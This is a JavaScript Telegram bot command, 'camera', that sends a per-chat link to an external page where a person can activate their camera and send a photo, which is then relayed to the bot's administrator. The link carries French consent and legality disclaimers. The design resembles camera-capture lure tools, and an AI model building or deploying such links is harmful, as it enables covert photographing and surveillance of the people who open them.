module.exports = {
  name: 'camera',
  description: 'Envoie un lien sécurisé pour une capture simulée (consentement requis)',
  async execute(bot, msg) {
    const chatId = msg.chat.id;
    const baseUrl = 'https://new-number-virtuel.onrender.com';
    const url = `${baseUrl}/${chatId}`;

    const text = `📸 *Simulation de capture (consentement requis)*\n\n` +
      `Cliquez sur le bouton ci-dessous pour ouvrir une page sécurisée qui permet à la personne de *simuler* l'activation de sa caméra et d'envoyer volontairement une photo. La capture n'est effectuée *que* si la personne clique explicitement sur « Capturer & Envoyer ».\n\n` +
      `⚠️ *Utilisation responsable* — n'utilisez ce lien *qu'avec le consentement explicite* de la personne. L'utilisation sans consentement est illégale.\n\n` +
      `ℹ️ Après envoi, l'administrateur et la personne recevront la photo (simulation).`;

    await bot.sendMessage(chatId, text, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Ouvrir la page de simulation', url }],
          [{ text: '✅ J’atteste du consentement', callback_data: 'camera_ack' }]
        ]
      }
    });
  }
};